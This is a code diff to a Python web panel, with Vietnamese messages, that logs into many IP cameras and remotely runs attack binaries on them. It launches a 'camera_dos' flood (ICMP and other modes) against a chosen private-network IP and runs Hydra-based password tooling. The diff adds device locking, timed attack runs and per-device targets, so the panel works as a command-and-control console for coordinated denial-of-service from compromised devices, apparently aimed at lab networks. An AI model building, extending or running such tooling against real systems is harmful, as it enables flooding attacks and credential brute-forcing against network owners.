@@ -623,13 +623,20 @@ class Engine:
         return 200, {"accepted": True}
 
     # -- connect cameras -----------------------------------------------
-    def connect_cameras(self, cameras):
+    def connect_cameras(self, cameras, req_user=None):
         results = []
 
         def _connect_one(cam):
             ip = cam["ip"]
             user = cam.get("username", "root")
             pw = cam.get("password", "")
+            if req_user:
+                locked, owner = device_lock(ip, req_user)
+                if not locked:
+                    msg = f"Camera đang được sử dụng bởi {owner}"
+                    self._emit_log("connect", "error", f"✗ {ip} — {msg}")
+                    results.append({"ip": ip, "ok": False, "msg": msg, "locked_by": owner})
+                    return
             self._emit_log("connect", "info", f"Đang kết nối {ip}…")
             ok, msg = self.pool.connect(ip, user, pw)
             if ok:
@@ -638,6 +645,8 @@ class Engine:
                            "last_connected": time.strftime("%Y-%m-%d %H:%M:%S")})
             else:
                 self._emit_log("connect", "error", f"✗ {ip} — {msg}")
+                if req_user:
+                    device_unlock(ip, req_user)
             results.append({"ip": ip, "ok": ok, "msg": msg})
 
         threads = []
@@ -653,15 +662,19 @@ class Engine:
         self._emit_log("connect", "ok", f"Kết nối xong: {ok_count}/{len(cameras)} thành công")
         return 200, {"accepted": True, "results": results}
 
-    def disconnect_camera(self, ip):
+    def disconnect_camera(self, ip, req_user=None):
         ok = self.pool.disconnect(ip)
         if ok:
             self._emit_log("connect", "info", f"Đã ngắt {ip}")
+            if req_user:
+                device_unlock(ip, req_user)
         return 200, {"accepted": True, "disconnected": ok}
 
-    def disconnect_all(self):
+    def disconnect_all(self, req_user=None):
         self.pool.disconnect_all()
         self._emit_log("connect", "info", "Đã ngắt tất cả")
+        if req_user:
+            device_unlock_all(req_user)
         return 200, {"accepted": True}
 
     # -- check binary --------------------------------------------------
@@ -849,7 +862,7 @@ class Engine:
         return 200, {"accepted": True, "results": results}
 
     # -- exec binary (phase 5) -----------------------------------------
-    def exec_binary(self, ips, target_ip, args_str="", mode="dos"):
+    def exec_binary(self, ips, target_ip, args_str="", mode="dos", duration=0):
         files = []
         if mode != "dos":
             try:
@@ -873,21 +886,24 @@ class Engine:
                         self._emit_log("exec", "error", message)
                         return 400, {"error": message}
                 self._emit_log("exec", "info", f"[{ip}] Đã chuẩn bị file Hydra")
+        timeout_prefix = f"timeout {int(duration)} " if duration and int(duration) > 0 else ""
         if mode == "dos":
             if not valid_ipv4(target_ip) or not is_private_ipv4(target_ip):
                 return 403, {"error": f"Mục tiêu {target_ip} ngoài RFC1918"}
             cmd = f"/tmp/camera_dos {target_ip} {args_str}".strip()
-            bg_cmd = f"killall camera_dos 2>/dev/null; rm -f /tmp/camdos.log; {cmd} > /tmp/camdos.log 2>&1 &"
+            bg_cmd = f"killall camera_dos 2>/dev/null; rm -f /tmp/camdos.log; {timeout_prefix}{cmd} > /tmp/camdos.log 2>&1 &"
             kill_name = "camera_dos"
         else:
             cmd = f"/tmp/camera-tools/cam-run --root /tmp/camera-tools {args_str}".strip()
-            bg_cmd = f"rm -f /tmp/camtools.log; {cmd} > /tmp/camtools.log 2>&1 &"
+            bg_cmd = f"rm -f /tmp/camtools.log; {timeout_prefix}{cmd} > /tmp/camtools.log 2>&1 &"
             kill_name = None
 
         results = []
 
+        dur_label = f" (timeout {int(duration)}s)" if duration and int(duration) > 0 else ""
+
         def _exec_one(ip):
-            self._emit_log("exec", "warn", f"[{ip}] $ {cmd}")
+            self._emit_log("exec", "warn", f"[{ip}] $ {cmd}{dur_label}")
             ok, out = self.pool.run_cmd(ip, bg_cmd, timeout=10)
             logfile = "/tmp/camdos.log" if mode == "dos" else "/tmp/camtools.log"
             self.pool.run_cmd(ip, f"sleep 2 && head -10 {logfile}", timeout=8)
@@ -903,15 +919,63 @@ class Engine:
 
         self._emit_result("exec", {"results": results, "command": cmd})
         if mode == "dos":
-            self._start_exec_monitor(ips)
+            self._start_exec_monitor(ips, duration=duration)
         else:
             self._start_tools_monitor(ips)
         return 200, {"accepted": True, "results": results}
 
-    def _start_exec_monitor(self, ips):
+    def exec_per_device(self, devices, target_ip, mode="dos"):
+        results = []
+        all_ips = []
+
+        def _exec_one(dev):
+            ip = dev.get("ip", "")
+            dur = int(dev.get("duration", 0) or 0)
+            args = (dev.get("args", "") or "").strip()
+            timeout_prefix = f"timeout {dur} " if dur > 0 else ""
+
+            if mode == "dos":
+                dev_target = (dev.get("target_ip", "") or target_ip or "").strip()
+                if not valid_ipv4(dev_target) or not is_private_ipv4(dev_target):
+                    results.append({"ip": ip, "ok": False, "msg": f"Mục tiêu {dev_target} ngoài RFC1918"})
+                    return
+                cmd = f"/tmp/camera_dos {dev_target} {args}".strip()
+                bg_cmd = f"killall camera_dos 2>/dev/null; rm -f /tmp/camdos.log; {timeout_prefix}{cmd} > /tmp/camdos.log 2>&1 &"
+            else:
+                cmd = f"/tmp/camera-tools/cam-run --root /tmp/camera-tools {args}".strip()
+                bg_cmd = f"rm -f /tmp/camtools.log; {timeout_prefix}{cmd} > /tmp/camtools.log 2>&1 &"
+
+            dur_label = f" (timeout {dur}s)" if dur > 0 else ""
+            self._emit_log("exec", "warn", f"[{ip}] $ {cmd}{dur_label}")
+            ok, out = self.pool.run_cmd(ip, bg_cmd, timeout=10)
+            logfile = "/tmp/camdos.log" if mode == "dos" else "/tmp/camtools.log"
+            self.pool.run_cmd(ip, f"sleep 2 && head -10 {logfile}", timeout=8)
+            results.append({"ip": ip, "ok": ok, "msg": out[:500]})
+
+        threads = []
+        for dev in devices:
+            all_ips.append(dev.get("ip", ""))
+            t = threading.Thread(target=_exec_one, args=(dev,), daemon=True)
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join(timeout=15)
+
+        max_dur = max((int(d.get("duration", 0) or 0) for d in devices), default=0)
+        per_durations = {d.get("ip", ""): int(d.get("duration", 0) or 0) for d in devices}
+        self._emit_result("exec", {"results": results})
+        if mode == "dos":
+            self._start_exec_monitor(all_ips, duration=max_dur, per_durations=per_durations)
+        else:
+            self._start_tools_monitor(all_ips)
+        return 200, {"accepted": True, "results": results}
+
+    def _start_exec_monitor(self, ips, duration=0, per_durations=None):
         self._exec_monitor_stop = False
         self._exec_monitor_ips = list(ips)
         self._exec_start_time = time.time()
+        self._exec_monitor_duration = int(duration) if duration else 0
+        self._exec_per_durations = per_durations or {}
         if getattr(self, '_exec_monitor_thread', None) and self._exec_monitor_thread.is_alive():
             return
         t = threading.Thread(target=self._exec_monitor_loop, daemon=True)
@@ -938,12 +1002,19 @@ class Engine:
             elapsed = int(time.time() - self._exec_start_time)
             for ip in list(self._exec_monitor_ips):
                 try:
+                    pid_ok, pid_out = self.pool.run_cmd(ip, "pidof camera_dos >/dev/null 2>&1 && echo ALIVE || echo DEAD", timeout=3)
+                    pid_alive = pid_ok and "ALIVE" in (pid_out or "")
+
                     ok, out = self.pool.run_cmd(ip, "tail -20 /tmp/camdos.log 2>/dev/null", timeout=5)
-                    if not ok or not out.strip():
-                        cam_data[ip] = {"status": "waiting", "elapsed": elapsed}
+                    if not ok or not (out or "").strip():
+                        entry = {"status": "stopped" if not pid_alive else "waiting", "elapsed": elapsed}
+                        dev_dur = self._exec_per_durations.get(ip, 0)
+                        if dev_dur > 0:
+                            entry['duration'] = dev_dur
+                        cam_data[ip] = entry
                         continue
                     lines = out.strip().split("\n")
-                    info = {"status": "running", "elapsed": elapsed, "modes": []}
+                    info = {"status": "running" if pid_alive else "stopped", "elapsed": elapsed, "modes": []}
 
                     for line in lines:
                         if 'ICMP flood BAT' in line:
@@ -1000,11 +1071,32 @@ class Engine:
                     if 'g_stop' in out or 'TONG KET' in out:
                         info['status'] = 'stopped'
 
+                    dev_dur = self._exec_per_durations.get(ip, 0)
+                    if dev_dur > 0:
+                        info['duration'] = dev_dur
                     cam_data[ip] = info
                 except Exception:
-                    cam_data[ip] = {"status": "error", "elapsed": elapsed}
+                    entry = {"status": "error", "elapsed": elapsed}
+                    dev_dur = self._exec_per_durations.get(ip, 0)
+                    if dev_dur > 0:
+                        entry['duration'] = dev_dur
+                    cam_data[ip] = entry
 
-            self.hub.broadcast({"type": "exec_monitor", "data": cam_data})
+            mon_msg = {"type": "exec_monitor", "data": cam_data}
+            if self._exec_monitor_duration > 0:
+                mon_msg["duration"] = self._exec_monitor_duration
+            self.hub.broadcast(mon_msg)
+
+            all_stopped = all(
+                v.get("status") in ("stopped", "error") for v in cam_data.values()
+            ) if cam_data else False
+            if self._exec_monitor_duration > 0 and elapsed >= self._exec_monitor_duration + 5:
+                all_stopped = True
+            if all_stopped:
+                self._emit_log("exec", "info", "Tất cả camera đã dừng — monitor tự tắt")
+                self._exec_monitor_stop = True
+                self.hub.broadcast({"type": "exec_done"})
+                break
 
     def _start_tools_monitor(self, ips):
         self._tools_monitor_stop = False
@@ -1103,6 +1195,41 @@ def get_user_state(username):
         return _user_state[username]
 
 
+# --------------------------------------------------------- device locks
+_device_locks = {}   # ip -> username
+_device_locks_lock = threading.Lock()
+
+
+def device_lock(ip, username):
+    with _device_locks_lock:
+        owner = _device_locks.get(ip)
+        if owner and owner != username:
+            return False, owner
+        _device_locks[ip] = username
+        return True, username
+
+
+def device_unlock(ip, username):
+    with _device_locks_lock:
+        if _device_locks.get(ip) == username:
+            del _device_locks[ip]
+            return True
+        return False
+
+
+def device_unlock_all(username):
+    with _device_locks_lock:
+        to_del = [ip for ip, u in _device_locks.items() if u == username]
+        for ip in to_del:
+            del _device_locks[ip]
+        return to_del
+
+
+def device_locks_snapshot():
+    with _device_locks_lock:
+        return dict(_device_locks)
+
+
 # ------------------------------------------------------------------ HTTP
 class Handler(SimpleHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
@@ -1192,6 +1319,14 @@ class Handler(SimpleHTTPRequestHandler):
             st, _ = r
             return self._json(200, {"cameras": st["pool"].status(),
                                     "connected": st["pool"].connected_ips()})
+
+        if path == "/api/device-locks":
+            u = self._get_user()
+            if not u:
+                return self._json(401, {"error": "Chưa đăng nhập"})
+            locks = device_locks_snapshot()
+            return self._json(200, {"locks": locks, "me": u})
+
         return super().do_GET()
 
     def do_POST(self):
@@ -1251,15 +1386,15 @@ class Handler(SimpleHTTPRequestHandler):
             cameras = body.get("cameras", [])
             if not cameras:
                 return self._json(400, {"error": "Chưa chọn camera"})
-            code, resp = engine.connect_cameras(cameras)
+            code, resp = engine.connect_cameras(cameras, req_user=username)
             return self._json(code, resp)
 
         if path == "/api/disconnect":
             ip = (body.get("ip") or "").strip()
             if ip:
-                code, resp = engine.disconnect_camera(ip)
+                code, resp = engine.disconnect_camera(ip, req_user=username)
             else:
-                code, resp = engine.disconnect_all()
+                code, resp = engine.disconnect_all(req_user=username)
             return self._json(code, resp)
 
         if path == "/api/check-binary":
@@ -1290,13 +1425,18 @@ class Handler(SimpleHTTPRequestHandler):
             return self._json(code, resp)
 
         if path == "/api/exec":
-            ips = body.get("ips") or pool.connected_ips()
             target_ip = (body.get("target_ip") or "").strip()
-            args_str = (body.get("args") or "").strip()
             mode = (body.get("mode") or "dos").strip()
-            if mode == "dos" and not target_ip:
+            per_device = body.get("per_device")
+            if mode == "dos" and not per_device and not target_ip:
                 return self._json(400, {"error": "Thiếu target_ip"})
-            code, resp = engine.exec_binary(ips, target_ip, args_str, mode=mode)
+            if per_device:
+                code, resp = engine.exec_per_device(per_device, target_ip, mode=mode)
+            else:
+                ips = body.get("ips") or pool.connected_ips()
+                args_str = (body.get("args") or "").strip()
+                duration = int(body.get("duration", 0) or 0)
+                code, resp = engine.exec_binary(ips, target_ip, args_str, mode=mode, duration=duration)
             return self._json(code, resp)
 
         if path == "/api/exec/stop":
